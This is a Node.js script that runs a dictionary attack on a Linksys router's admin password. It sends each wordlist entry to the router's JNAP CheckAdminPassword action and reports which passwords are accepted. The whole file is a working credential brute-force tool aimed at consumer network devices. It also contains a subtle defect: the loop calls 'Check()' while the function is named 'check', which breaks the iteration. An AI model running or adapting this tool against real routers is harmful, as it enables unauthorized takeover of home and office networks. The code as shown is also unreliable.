"use strict";

//Dependencies
const request = require("request-async")
const fs = require("fs")

//Variables
const args = process.argv.slice(2)

//Main
if(!args.length) return console.log("node index.js <url> <username> <dictionary>")

if(!args[1]) return console.log("Invalid username.")
if(!args[2]) return console.log("Invalid dictionary.")
if(!fs.existsSync(args[2])) return console.log("Invalid dictionary.")

const dictionaryData = fs.readFileSync(args[2], "utf8").split("\n")

if(!dictionaryData) return console.log("Dictionary data is empty.")

var dictionaryIndex = 0

check()
async function check(){
    if(dictionaryIndex == dictionaryData.length) return console.log("Finished checking.")

    var response = await request.post(`${args[0]}/JNAP/`, {
        headers: {
            "Content-Type": "application/json; charset=UTF-8",
            "X-JNAP-Action": "http://linksys.com/jnap/core/CheckAdminPassword",
            "X-JNAP-Authorization": `Basic ${Buffer.from(`${args[1]}:${dictionaryData[dictionaryIndex]}`).toString("base64")}`
        },
        body: "{}"
    })
    
    response = response.body

    response.indexOf("Invalid authorization") === -1 ? console.log(`Valid password ${dictionaryData[dictionaryIndex]}`) : console.log(`Invalid password ${dictionaryData[dictionaryIndex]}`)

    dictionaryIndex++
    Check()
}
